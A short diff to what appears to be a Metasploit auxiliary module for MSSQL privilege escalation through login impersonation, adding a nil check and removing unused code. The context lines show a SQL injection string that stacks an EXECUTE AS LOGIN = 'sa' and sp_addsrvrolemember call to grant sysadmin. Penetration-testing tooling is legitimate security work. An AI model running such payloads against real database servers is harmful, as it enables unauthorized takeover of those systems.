@@ -85,10 +85,6 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def peer
-    "#{rhost}:#{rport}"
-  end
-
   def get_username
     # Setup query to check for database username
     clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
@@ -182,7 +178,7 @@ class Metasploit3 < Msf::Auxiliary
       end
 
       # check if user is a sysadmin
-      if parsed_result[0] == '1'
+      if parsed_result && parsed_result[0] == '1'
         print_good("#{peer} -   #{imp_user} is a sysadmin!")
         return imp_user
       else
@@ -200,6 +196,6 @@ class Metasploit3 < Msf::Auxiliary
     evil_sql = "1;EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember 'MyUser1','sysadmin';Revert;--"
 
     # Execute Query
-    result = mssql_query(evil_sql)
+    mssql_query(evil_sql)
   end
 end
